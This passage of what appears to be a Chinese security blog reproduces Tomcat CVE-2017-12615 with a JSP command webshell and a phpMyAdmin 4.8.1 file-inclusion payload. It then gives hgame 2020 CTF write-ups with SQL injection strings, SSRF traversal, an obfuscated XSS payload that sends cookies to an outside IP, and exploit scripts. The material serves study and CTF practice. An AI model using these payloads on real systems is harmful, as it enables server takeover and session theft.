...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...</code></pre><pre><code class="java">&lt;%
    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print(&quot;&lt;pre&gt;&quot;);
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print(&quot;&lt;/pre&gt;&quot;);
    }
%&gt;</code></pre>
<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import requests
def poc(url):
    filename=&quot;tomcat_check_vuln.txt&quot;
    content=&quot;test&quot;
    try:
        requests.put(url+&quot;/&quot;+filename,data=conetent)
        res=requests.get(url+&quot;/&quot;+filename)
    except :
        return False

    if res.status_code==200:
        return True
    return False
</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/08/Tomcat">https://explorersss.github.io/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/](<a href="https://explorersss.github.io/2020/02/08/Tomcat">https://explorersss.github.io/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" data-id="ck6da147t0000ggv01xdw3guj" data-title="Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpmyadmin 4.8.1 rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/08/phpmyadmin%204.8.1%20rce/" class="article-date">
  <time class="dt-published" datetime="2020-02-08T06:50:47.678Z" itemprop="datePublished">2020-02-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/08/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p>
<p>登陆账号</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p>
<p>漏洞位置:<code>index.php</code>:57</p>
<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
) {
    include $_REQUEST[&#39;target&#39;];
    exit;
}</code></pre>
<p>非常明显的任意文件包含漏洞</p>
<p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p>
<p>跟进去</p>
<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }</code></pre>
<p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p>
<pre><code class="php">array (
  0 =&gt; &#39;db_datadict.php&#39;,
....
)</code></pre>
<p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p>
<p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p>
<p>通用的payload:</p>
<p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
<p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p>
<p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="https://explorersss.github.io/2020/02/08/phpmyadmin">https://explorersss.github.io/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/08/phpmyadmin%204.8.1%20rce/" data-id="ck6d8pgbi0000qov05vfnbeoq" data-title="phpmyadmin 4.8.1 rce" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020hgame" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/07/2020hgame/" class="article-date">
  <time class="dt-published" datetime="2020-02-07T12:20:03.284Z" itemprop="datePublished">2020-02-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/07/2020hgame/">2020hgame</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote>
<p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p>
</blockquote>
<p>根据提示下载.git</p>
<pre><code class="bash">$ git remote -v
#查看git</code></pre>
<p>查看提交历史拿到flag</p>
<h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p>
<pre><code>GET / HTTP/1.1
Host: kyaru.hgame.n3ko.co
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Cosmos Brower
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
referer: https://vidar.club/ 
x-forwarded-for: 127.0.0.1
If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
Connection: close

</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p>
<p>修改GET为post</p>
<h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p>
<h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?php
include &quot;config.php&quot;;
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET[&#39;debug&#39;])) {
        $debug = $_GET[&#39;debug&#39;];
        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
            die(&quot;args error!&quot;);
        }
        eval(&quot;var_dump($$debug);&quot;);
    }
}

if(isset($_SESSION[&#39;username&#39;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}
else {
    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){
            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
            header(&quot;Location: admin.php&quot;);
            exit();
        }
        else {
            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;
        }
    }
}
?&gt;
</code></pre>
<p>adminpassword: 0e114902927253523756713132279690 </p>
<p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p>
<p>adminusername: Cosmos! </p>
<p>index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
session_start();

if(isset($_SESSION[&#39;username&#39;])) {
    header(&quot;Location: admin.php&quot;);
    exit();
}

$action = @$_GET[&#39;action&#39;];
$filter = &quot;/config|etc|flag/i&quot;;

if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {
    if(preg_match($filter, $_GET[&#39;action&#39;])) {
        echo &quot;Hacker get out!&quot;;
        exit();
    }
        include $action;
}
elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
    header(&quot;Location: ?action=login.php&quot;);
    exit();
}</code></pre>
<p>admin.php</p>
<pre><code class="php">&lt;?php
include &quot;config.php&quot;;
session_start();
if(!isset($_SESSION[&#39;username&#39;])) {
    header(&#39;Location: index.php&#39;);
    exit();
}

function insert_img() {
    if (isset($_POST[&#39;img_url&#39;])) {
        $img_url = @$_POST[&#39;img_url&#39;];
        $url_array = parse_url($img_url);
        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
    }
}
?&gt;

&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;
</code></pre>
<p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p>
<p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p>
<p>过滤:select</p>
<p>黑名单:空格</p>
<pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
information_schema,easysql
0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
f1aggggggggggggg,messages#
GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;
fl4444444g

hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p>
<pre><code class="php">&lt;?php

// function encrypt($str){
//     $result = &#39;&#39;;
//     for($i = 0; $i &lt; strlen($str); $i++){
//         $result .= chr(ord($str[$i]) + 1);
//     }
//     return $result;
// }
function encrypt($str)
{
    $result = &#39;&#39;;
    for($i = 0; $i &lt; strlen($str); $i++){
        $result .= chr(ord($str[$i]) - 1);
    }
    return $result;
}
$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;
$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);
preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;)
{
    $arr=array();
    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
    $newcmd=$arr[0].$newcmd.&quot;)&quot;;    
    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

}

$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    


$dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);
?&gt;</code></pre>
<p>python </p>
<pre><code class="python">import requests
def get_flag():
    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]
    enccmd=enccmd[:len(enccmd)-75]
    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]
    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]
    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}
    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text
    data={&quot;token&quot;:dec}
    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])

get_flag()</code></pre>
<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre>
<p>输入会变成大写</p>
<h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p>
<p>而默认的逻辑是没法实现的</p>
<pre><code class="php">        if($this-&gt;rank &lt;= 2){
                $this-&gt;rank = 2;
            }</code></pre>
<p>阅读代码发现反序列化点:</p>
<p><code>Monster</code>的<code>__construct</code>方法</p>
<pre><code class="php">public function __construct($key){
        $this-&gt;encryptKey = $key;
        if(!isset($_COOKIE[&#39;monster&#39;])){
            $this-&gt;Set();
            return;
        }

        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);
        if(strlen($monsterData) &gt; 32){
            $sign = substr($monsterData, -32);
            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
            if(md5($monsterData . $this-&gt;encryptKey) === $sign){
                $this-&gt;monsterData = unserialize($monsterData);
            }else{
                session_start();
                session_destroy();
                setcookie(&#39;monster&#39;, &#39;&#39;);
                header(&#39;Location: index.php&#39;);
                exit;
            }
        }

        $this-&gt;Set();     
    }</code></pre>
<p>但是要知道<code>$key</code>才能反序列化</p>
<p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p>
<pre><code class="php">
class Game
{   
    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;

    private $sign = &#39;&#39;;
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION[&#39;player&#39;] = $playerName;
        if(!isset($_SESSION[&#39;exp&#39;])){
            $_SESSION[&#39;exp&#39;] = 0;
        }
        $data = [$playerName, $this-&gt;encryptKey];
        $this-&gt;init($data);//set sign
        $this-&gt;monster = new Monster($this-&gt;sign);
        $this-&gt;rank = new Rank();
    }

    private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }
}</code></pre>
<p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p>
<pre><code class="php">public function __destruct(){
        // 确保程序是跑在服务器上的！
        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];
        if($this-&gt;key === $this-&gt;serverKey){
            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;
        }else{
            // 非正常访问
            session_start();
            session_destroy();
            setcookie(&#39;monster&#39;, &#39;&#39;);
            header(&#39;Location: index.php&#39;);
            exit;
        }
    }</code></pre>
<p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p>
<p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p>
<p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p>
<p>如:</p>
<pre><code class="php">&lt;?php
class test{
    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;
    public function __destruct()
    {
        echo $this-&gt;my_static;
    }

}
class tesa{

}
$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));
unserialize($a);


结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
<p>于是构造</p>
<pre><code class="php">&lt;?php
class Game
{
    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;

    public $sign = &#39;&#39;;
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION[&#39;player&#39;] = $playerName;
        if(!isset($_SESSION[&#39;exp&#39;])){
            $_SESSION[&#39;exp&#39;] = 0;
        }
        $data = [$playerName, $this-&gt;encryptKey];
        $this-&gt;init($data);//set sign
    }

    private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }
}
class Rank
{
    private $rank;
//    private $serverKey;     // 服务器的 Key
//    private $key;

    public function __construct()
    {
        $this-&gt;rank=1;
    }

    public function __destruct(){

    }
}
$s=new Rank();
//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);
$a=new Game($_GET[&#39;name&#39;]);
$sign = md5(serialize($s) . $a-&gt;sign);
print( base64_encode(serialize($s) . $sign));
?&gt;
</code></pre>
<h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p>
<p>前一段时间爆出来的mt_srand逆向刚好可以用到</p>
<p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p>
<pre><code class="php">import requests
import os

burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;
burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text

a=eval(result)
p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )
x=p.read().strip()

burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;
burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
burp0_data = {&quot;ans&quot;: x}
print(burp0_data)
result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
print(result)
</code></pre>
<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p>
<p>admin,123456</p>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p>
<p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p>
<p>我来模拟以下造成条件竞争漏洞的原因</p>
<p>首先猜测以下solve和buy方法的流程</p>
<pre><code class="php">function solve()
{
    #1. $num=从数据库中查找要用户持有的卖出商品的个数
    #2. 如果数量足够,则进行下一步,否则返回并报错
    #3. 在数据库中增加用户账户里的钱
    #4. 在数据库中减少用户拥有该商品的数量
}</code></pre>
<p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p>
<ol>
<li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li>
<li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li>
<li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li>
<li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li>
<li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li>
<li>b进程结束</li>
</ol>
<p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p>
<p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p>
<p>刷钱脚本</p>
<pre><code class="python">from multiprocessing import Pool
import requests
def buy(num,loop=3):

    for i in range(loop):
        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if &quot;success&quot; in result:
            print(&quot;successfully buy %d items&quot; % num)


def solve(num,loop=3):

    for i in range(loop):
        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if &quot;success&quot; in result:
            print(&quot;successfully solve %d items&quot; % num)

if __name__==&#39;__main__&#39;:
    i=0
    while True:
        p = Pool(100)
        num=500
        for i in range(100):
            p.apply_async(buy, args=(num,))
        print(&#39;Waiting for all buy subprocesses done...&#39;)
        p.close()
        p.join()
        print(&#39;All subprocesses done.&#39;)

        p = Pool(100)

        for i in range(100):
            p.apply_async(solve, args=(num,))
        print(&#39;Waiting for all solve subprocesses done...&#39;)
        p.close()
        p.join()
        print(&#39;All subprocesses done.&#39;)
</code></pre>
<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p>
<pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, 
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]
